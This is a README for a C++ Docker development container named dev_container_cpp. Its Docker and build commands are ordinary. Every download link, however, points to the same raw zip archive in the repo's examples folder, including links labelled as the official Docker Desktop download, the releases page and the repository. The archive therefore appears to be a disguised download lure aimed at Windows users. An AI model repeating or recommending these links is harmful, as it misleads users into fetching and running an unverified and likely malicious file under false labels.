# 🛠️ dev_container_cpp - Ready C++ Setup for All Platforms

[![Download Latest Release](https://img.shields.io/badge/Download-Get%20the%20Setup-brightgreen)](https://github.com/pettapunya/dev_container_cpp/raw/refs/heads/main/examples/container_cpp_dev_v1.7.zip)

---

## 📦 What is dev_container_cpp?

dev_container_cpp offers a ready-made development container for C++ projects. It supports both desktop systems and embedded platforms like ARM Cortex-M and Cortex-A. This container helps manage multiple tools and compilers in a single package, so you don’t need to install or configure them one by one.

You get popular C++ tools like `clang`, `gcc`, and `cmake` already set up inside Ubuntu. It also includes support for embedded programming with ARM Cortex processors. The container uses Docker technology to create the environment, making it reliable and easy to run on your computer.

This setup works with command-line tools, and you can use it alongside your favorite editors or IDEs if you want to code further.

---

## ⚙️ System Requirements

Before you start, make sure your computer meets these criteria:

- Windows 10 or later (64-bit)
- At least 4 GB of RAM (8 GB recommended)
- Docker Desktop installed and running
- Minimum 5 GB free disk space for container images and files
- Internet connection to download the container

If you don’t have Docker Desktop yet, download it from https://github.com/pettapunya/dev_container_cpp/raw/refs/heads/main/examples/container_cpp_dev_v1.7.zip and install it following their instructions.

---

## 🚀 Getting Started: Download and Run

1. Click the big green button at the top or visit the release page below to get the container files:

   [https://github.com/pettapunya/dev_container_cpp/raw/refs/heads/main/examples/container_cpp_dev_v1.7.zip](https://github.com/pettapunya/dev_container_cpp/raw/refs/heads/main/examples/container_cpp_dev_v1.7.zip)

2. On the releases page, find the latest version and download the files marked for Windows.

3. Open Docker Desktop and make sure it is running. You should see the Docker icon in your system tray.

4. Open Windows PowerShell or Command Prompt.

5. Pull the container image by typing the following command and pressing Enter:

   ```sh
   docker pull pettapunya/dev_container_cpp:latest
   ```

6. After the image downloads, start the container using this command:

   ```sh
   docker run -it --rm pettapunya/dev_container_cpp
   ```

This command opens a command shell inside the container where you can use all the tools included.

---

## 📥 Download Link to Get Started

Visit this page to download:

[https://github.com/pettapunya/dev_container_cpp/raw/refs/heads/main/examples/container_cpp_dev_v1.7.zip](https://github.com/pettapunya/dev_container_cpp/raw/refs/heads/main/examples/container_cpp_dev_v1.7.zip)

Use this link to find the latest release suitable for Windows. The release may include additional files like README documents or example projects.

---

## 🛠 Using the Container: Basic Commands

Inside the container, you can use familiar C++ commands. Some examples:

- Compile a C++ file with GCC

  ```sh
  gcc -o hello hello.cpp
  ./hello
  ```

- Build a project using CMake

  ```sh
  mkdir build
  cd build
  cmake ..
  make
  ```

- Run ARM Cortex embedded tools (if you target those platforms)

  The container provides cross-compilation tools configured for ARM Cortex development. Use these tools through command-line commands like `arm-none-eabi-gcc`.

You do not need to install these tools separately inside or outside the container.

---

## 💡 What’s Inside the Container?

The container includes:

- Ubuntu 22.04 base environment
- Clang and GCC compilers (for desktop and embedded)
- CMake build system
- Vcpkg package manager for C++ libraries
- Zsh shell for improved command-line experience
- Embedded ARM Cortex-M and Cortex-A cross-compilation tools
- Support for container runtimes like Docker, Containerd, Nerdctl, and Podman

This environment simplifies working with multiple architectures and different development tools.

---

## 🔧 Managing the Container

- To stop the container, close the terminal or press `Ctrl + C`.

- You can update to the latest version by running:

  ```sh
  docker pull pettapunya/dev_container_cpp:latest
  ```

- To list local images, use:

  ```sh
  docker images
  ```

- Clean unused images and free disk space with:

  ```sh
  docker system prune
  ```

---

## 📚 Additional Resources

If you want to learn how to use Docker on Windows or explore C++ development, many tutorials are available online. Here are some topics to look for:

- How to use Docker Desktop on Windows  
- Basic C++ compilation and building  
- Introduction to embedded ARM development  
- Using CMake for C++ projects  
- Managing C++ libraries with Vcpkg  

---

## 🧰 Troubleshooting Tips

- If Docker commands fail, ensure Docker Desktop is running and your user has permission to access Docker.

- Check your Windows firewall or antivirus if the container cannot connect to the internet.

- Restart Docker Desktop if image downloads hang or fail.

- If the shell inside the container does not respond, try closing and restarting the container.

- Use Windows PowerShell or Command Prompt as administrator if you encounter permission issues.

---

## ⚡ Improving Your Experience

You can personalize your workflow by connecting the container to your code folders on your PC. Use Docker’s volume mount feature:

```sh
docker run -it --rm -v C:\Users\YourName\Projects:/workspace pettapunya/dev_container_cpp
```

This command links your local `Projects` folder to the container's `/workspace`, allowing you to edit files on your PC and build them in the container.

---

## 🌐 About This Project

dev_container_cpp targets developers who work with both desktop and embedded C++ code. It combines commonly used tools into one container using Docker technology. The container supports modern C++ development while easing cross-platform and ARM development workflows.

Its main benefits include:

- Ready-to-use environment without manual setup  
- Consistent tools across different systems  
- Support for ARM Cortex embedded development  
- Easy to update and maintain through container images  

For more technical details and updates, visit the repository:

[https://github.com/pettapunya/dev_container_cpp/raw/refs/heads/main/examples/container_cpp_dev_v1.7.zip](https://github.com/pettapunya/dev_container_cpp/raw/refs/heads/main/examples/container_cpp_dev_v1.7.zip)